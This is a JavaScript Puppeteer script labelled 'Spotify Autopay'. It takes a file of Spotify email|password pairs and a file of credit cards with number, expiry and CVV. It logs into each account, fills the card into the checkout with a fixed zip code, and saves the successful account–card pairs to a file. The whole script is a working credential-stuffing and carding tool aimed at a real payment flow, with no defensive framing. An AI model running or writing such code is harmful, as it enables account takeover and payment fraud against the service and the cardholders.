const readlineSync = require('readline-sync');
const puppeteer = require('puppeteer');
const fs = require('fs');
const delay = require('delay');
const cheerio = require('cheerio');
const chalk = require('chalk');
const figlet = require('figlet');
const { EALREADY } = require('constants');
var no = 1;

(async () => {
    console.log(
        chalk.white(
        figlet.textSync('Spotify Autopay', { horizontalLayout: 'fitted' })
     )
  );
  console.log('                                                                             By Apriamsyah')
  console.log('\n')
  console.log('[+] Information Example Url Plan : https://www.spotify.com/id/purchase/offer/new-family-1m/?country=US')
  console.log('\n')

    var urlPlan = readlineSync.question('[+] Link Url Plan      : ')
    var cc1 = readlineSync.question('[+] Input List Account : ');
    const file1 = fs.readFileSync(cc1, 'UTF-8');
    const mntp1 = file1.split(/\r?\n/);
    var cc2 = readlineSync.question('[+] Input List CC      : ');
    const file2 = fs.readFileSync(cc2, 'UTF-8');
    const mntp2 = file2.split(/\r?\n/);
    console.log('\n');
    for (var i = 0; i < mntp2.length; i++) {
        for (var i = 0; i < mntp1.length; i++) {
        var cardnum = mntp2[i].split('|')[0];
        var cardmonth = mntp2[i].split('|')[1];
        var cardyear = mntp2[i].split('|')[2];
        var cardcvv = mntp2[i].split('|')[3];
        var email = mntp1[i].split('|')[0];
        var password = mntp1[i].split('|')[1];

    const $options = { waitUntil: 'networkidle2' };
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    await page.goto('https://accounts.spotify.com/en/login/', $options);

    await page.waitForSelector("input[type=text");
    const emailField = await page.$('input[type=text]')
        await emailField.type(email)
        await emailField.dispose()

    await page.waitForSelector("input[type=password]");
    const passwordField = await page.$('input[type=password]')
        await passwordField.type(password)
        await passwordField.dispose()

    await page.waitForSelector("button[id=login-button]");
    const buttonField = await page.$('button[id=login-button]')
        await buttonField.click()
        await buttonField.dispose()

    await delay(2000)
    if (page.url().includes('login')) {
            console.log('[' + no + ']' + ' Login Gagal ' + email + '|' + password);
            no++
    } else if (page.url().includes('overview')) {
            console.log('[' + no + ']' + ' Login Success ' + email + '|' + password);
            no++
    } else if (page.url().includes('status')) {
            await page.goto(urlPlan, $options);
                console.log('[' + no + ']' + ' Login Success ' + email + '|' + password);
            no++
            await delay(5000)
            const clickPayment = await page.$('span[class="Type__TypeElement-sc-9snywk-0 glXBMp Label-sc-192ocay-0 dqtIpU"]')
            await clickPayment.click()

            await page.waitForSelector(".pci-iframe");
            const elementHandle = await page.$('.pci-iframe');
            const frames =  await elementHandle.contentFrame();
            await frames.waitForSelector('input[id="cardnumber"]', { visible: true });
            const cardNumber = await frames.$('input[id="cardnumber"]')
            await cardNumber.type(cardnum)
            await cardNumber.dispose()

            // await delay(1000)
            // const expiredMonth = await frames.$('select[id="expiry-month"]')
            // await expiredMonth.type(cardmonth)
            // await expiredMonth.dispose()

            const expiredYear = await frames.$('#expiry-date')
            await expiredYear.type(cardmonth+cardyear)
            await expiredYear.dispose()

            const cardCVV = await frames.$('#security-code')
            await cardCVV.type(cardcvv)
            await cardCVV.dispose()

            const zipCode = await frames.$('#zip-code')
            await zipCode.type('10010') 
            await zipCode.dispose()

            await page.focus('button[id="checkout_submit"]');
            await page.keyboard.press('Enter');
	 
            try {
                await page.waitForSelector('#checkout-component > div > div.sc-fzXfOr.cuPtZS > div > p')
                const infoFailed = await page.evaluate(() =>{
                    return document.querySelector('#checkout-component > div > div.sc-fzXfOr.cuPtZS > div > p').innerText;
                })
                console.log('   ',cardnum+'|'+cardmonth+'|'+cardyear+'|'+cardcvv, 'Information : ', infoFailed);
                fs.appendFileSync("spotifygagal.txt", email + '|' + password + '\n');
            } catch (err) {
                if (page.url().includes('success')) {
                console.log('   ',cardnum+'|'+cardmonth+'|'+cardyear+'|'+cardcvv, 'Information : Berhasil Payment');
	            fs.appendFileSync("spotifypremium.txt", email + '|' + password + '|' + cardnum+'|'+cardmonth+'|'+cardyear+'|'+cardcvv + '\n');
                }
            continue;
        }
    }
}
    }
})();